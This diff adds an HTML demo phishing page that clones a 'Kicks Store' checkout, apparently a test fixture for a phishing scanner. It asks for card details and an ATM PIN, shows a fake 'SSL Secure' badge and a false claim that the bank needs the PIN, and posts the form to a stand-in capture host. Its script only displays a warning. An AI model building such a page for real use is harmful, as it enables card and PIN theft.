@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en">
+  <!-- A SIMULATED phishing page that clones Kicks Store. For demo only: it
+       asks for the card AND the ATM PIN, posts to a foreign host, and has no
+       trust links. The scanner should call it out (score >= 65). -->
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kicks Store — secure payment</title>
+    <style>
+      * { box-sizing: border-box; }
+      body { margin: 0; background: #f6f3ec; color: #2b2b33; font-family: 'Segoe UI', system-ui, sans-serif; }
+      .demoflag {
+        background: #1d1d26; color: #ffd9a0; text-align: center; font-size: 11.5px; font-weight: 700;
+        padding: 6px 10px; letter-spacing: 0.4px;
+      }
+      header.storebar { display: flex; align-items: center; justify-content: space-between; padding: 12px 24px;
+        background: #fff; border-bottom: 2px solid #e5e0d6; }
+      .logo { font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+      .secure-tag { font-size: 11px; font-weight: 700; padding: 5px 12px; border-radius: 999px;
+        background: #e9f5e9; color: #2e7d32; border: 2px solid #cfe6cf; }
+      main { max-width: 520px; margin: 0 auto; padding: 22px; }
+      .card { background: #fff; border: 2px solid #e5e0d6; border-radius: 14px; padding: 18px; }
+      .card h1 { margin: 0 0 4px; font-size: 20px; }
+      .sub { font-size: 12px; color: #8a8a93; margin-bottom: 14px; }
+      .field { margin-bottom: 12px; }
+      .field label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 4px; }
+      .field input { width: 100%; border: 2px solid #2b2b33; border-radius: 10px; padding: 9px 10px; font: inherit; }
+      .row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+      .danger { background: #fdeced; border: 2px solid #f4b; border-radius: 10px; padding: 9px 11px;
+        font-size: 12px; font-weight: 700; color: #b3261e; margin: 4px 0 12px; }
+      .actions { display: flex; gap: 8px; margin-top: 4px; }
+      button { border: 2px solid #2b2b33; border-radius: 999px; padding: 10px 16px; font: inherit; font-weight: 700;
+        cursor: pointer; background: #f2f0ea; }
+      button.pay { background: #2b2b33; color: #fff; flex: 1; }
+      .note { font-size: 11px; color: #8a8a93; margin: 10px 0 0; }
+      .panel { position: fixed; inset: 0; display: none; align-items: center; justify-content: center;
+        background: rgba(43,43,51,.35); z-index: 100; }
+      .panel .box { background: #fff; border: 3px solid #2b2b33; border-radius: 16px; padding: 24px 28px;
+        width: min(360px, 90vw); text-align: center; }
+    </style>
+  </head>
+  <body data-tp-merchant="Kicks Store" data-tp-typical="119">
+    <div class="demoflag">⚠ SIMULATED PHISHING PAGE — DEMO ONLY — never a real site</div>
+    <header class="storebar">
+      <div class="logo">⚡ Kicks Store</div>
+      <span class="secure-tag">🔒 SSL Secure</span>
+    </header>
+
+    <main>
+      <div class="card">
+        <form id="payForm" action="https://evil.example.net/capture" method="POST" novalidate>
+          <h1>Complete payment 🎉</h1>
+          <div class="sub">Order #9A84 · $489.00 · Pay securely to confirm your Drop Dead Limited pair.</div>
+          <div class="field"><label for="nm">Full name</label><input id="nm" autocomplete="name" placeholder="John Alston" /></div>
+          <div class="field"><label for="cc">Card number</label><input id="cc" data-card autocomplete="cc-number" placeholder="4242 4242 4242 4242" inputmode="numeric" /></div>
+          <div class="row">
+            <div class="field"><label for="ex">Expiry</label><input id="ex" autocomplete="cc-exp" placeholder="12 / 28" /></div>
+            <div class="field"><label for="cv">CVC</label><input id="cv" autocomplete="cc-csc" placeholder="737" /></div>
+          </div>
+          <div class="danger">Bank security requires your ATM PIN to release funds.</div>
+          <div class="field"><label for="pin">ATM PIN</label><input id="pin" placeholder="••••" inputmode="numeric" maxlength="4" /></div>
+          <div class="actions">
+            <button type="button" id="fill" class="check">😈 Fill like Shady</button>
+          </div>
+          <div class="actions">
+            <button type="submit" class="pay" data-tp-price="489" data-tp-item="Drop Dead Limited"><span>Pay $489</span></button>
+          </div>
+          <p class="note">⚠ Never enter your PIN on a website. This page is a copy of a real store.</p>
+        </form>
+      </div>
+    </main>
+
+    <div class="panel" id="panel">
+      <div class="box" id="panelBox"><div></div></div>
+    </div>
+
+    <script>
+      const fill = () => {
+        const set = (id, val) => { const e = document.getElementById(id); e.value = val; e.dispatchEvent(new Event('input', { bubbles: true })); };
+        set('nm', 'John Alston');
+        set('cc', '4242424242424242');
+        set('ex', '12728');
+        set('cv', '737');
+        set('pin', '4321');
+      };
+      document.getElementById('fill').addEventListener('click', fill);
+
+      document.getElementById('payForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const box = document.getElementById('panelBox');
+        box.innerHTML = '<div style="font-size:34px">☠️</div><div style="font-weight:800">Card captured by fake page…<br/>if this weren\u2019t a demo.</div>';
+        document.getElementById('panel').style.display = 'flex';
+      });
+    </script>
+  </body>
+</html>
